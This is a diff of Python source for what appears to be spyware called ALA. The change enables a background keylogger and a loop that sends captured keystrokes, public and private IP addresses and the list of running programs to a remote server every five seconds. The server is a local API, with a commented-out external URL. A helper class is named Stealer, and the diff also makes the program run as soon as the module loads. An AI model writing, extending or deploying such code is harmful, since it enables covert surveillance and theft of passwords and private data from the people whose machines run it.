@@ -25,9 +25,9 @@ from typing import Any
 #//                                                                                        
 #!                              init keylogger and blacklist
 #//                                                                                        
-keylogger = Keylogger(path = "", debug_state = False)
+keylogger = Keylogger(path = "", debug_state = False) #! init keylogger
 
-blacklist = [
+blacklist = [ #! blacklist of backgroud software that are not important
 
     "AggregatorHost.exe",
     "ApplicationFrameHost.exe",
@@ -226,6 +226,7 @@ class ALA:
     #agl ____init____
     def __init__(self):
 
+        #? self.url = "https://mcdb.zisia13.com/ALA"
         self.url = "http://localhost:8000/api"
         self.header = {"Content-Type": "application/json"}
         self.login_name = os.getlogin()
@@ -307,45 +308,50 @@ class ALA:
                 return None
 
     #agl ____Start____
-    async def ala(self): #! Mainloop
+    async def ala(self): #! Mainloop (execute all)
 
-        keylogger_thread = threading.Thread(target = keylogger.start, daemon = True)
-        keylogger_thread.start()
-
-        time_counter = 0
+        keylogger_thread = threading.Thread(target = keylogger.start, daemon = True) #! start a thread 
+        keylogger_thread.start() #! start keylogger
 
         while True:
 
-            #try:
-            #
-            #    await self.send_online_status()
-            #    
-            #except Exception as network_error:
-            #    
-            #    print(network_error)
-
+            try:
             
-            #unfiltered_running_apps = await Stealer.get_running_apps()
-            #
-            #filtered_running_apps = await Stealer.filter_running_apps(unfiltered_running_apps)
-            #
-            #for app in filtered_running_apps:
-            #
-            #    print(app)
+                #agl ____send_online_status____
+                await self.send_online_status()
 
+                #agl ____send_IP_adresses____
+                public_ip = await Stealer.get_public_ip()
+                private_ip = await Stealer.get_private_ip()
 
+                await self.send_data(command = Commands.public_ip, data = public_ip)
+                await self.send_data(command = Commands.private_ip, data = private_ip)
 
-            await asyncio.sleep(2)
+                #agl ____running_apps____
+                unfiltered_running_apps = await Stealer.get_running_apps() #! get raw running apps
+            
+                filtered_running_apps = await Stealer.filter_running_apps(unfiltered_running_apps) #! filter running apps
 
-            time_counter += 1
+                await self.send_data(command = Commands.running_apps, data = filtered_running_apps) #! send running apps to server
 
-            if not time_counter % 5:
+                for app in filtered_running_apps:
+            
+                    print(app)
 
-                time_counter = 0
-
+                #agl ____keylogger____
                 keylogger.build_data()
-                print(keylogger.get_built_data())
+                keylogger_data = keylogger.get_built_data()
+                print(keylogger_data)
                 keylogger.clear_data()
+
+                await self.send_data(command = Commands.keylogger_data, data = keylogger_data) #! send data to server
+
+            except Exception as loop_error:
+                
+                print(loop_error)
+
+            #agl ____timeout____
+            await asyncio.sleep(5)
 
     def run(self): #! Run Mainloop
 
@@ -354,8 +360,6 @@ class ALA:
 #//                                                                                        
 #!                                      Start
 #//                                                                                        
-if __name__ == "__main__":
+ala = ALA() #! create object
 
-    ala = ALA()
-
-    ala.run()
+ala.run() #! run software
